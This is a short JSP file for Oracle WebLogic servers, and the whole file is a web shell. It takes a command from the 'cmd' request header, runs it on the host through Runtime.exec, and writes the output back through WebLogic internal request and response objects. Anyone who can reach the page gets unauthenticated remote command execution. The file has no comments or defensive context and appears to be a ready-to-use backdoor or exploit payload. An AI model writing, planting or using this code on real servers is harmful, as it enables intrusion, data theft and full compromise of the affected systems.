<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
	String cmd = ((weblogic.servlet.internal.ServletRequestImpl)((weblogic.work.ExecuteThread)Thread.currentThread()).getCurrentWork()).getHeader("cmd");
    String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
    weblogic.servlet.internal.ServletResponseImpl r = ((weblogic.servlet.internal.ServletRequestImpl)((weblogic.work.ExecuteThread)Thread.currentThread()).getCurrentWork()).getResponse();
    weblogic.servlet.internal.ServletOutputStreamImpl outputStream = r.getServletOutputStream();
    outputStream.writeStream(new weblogic.xml.util.StringInputStream(res));
    outputStream.flush();
    response.getWriter().write("");
%>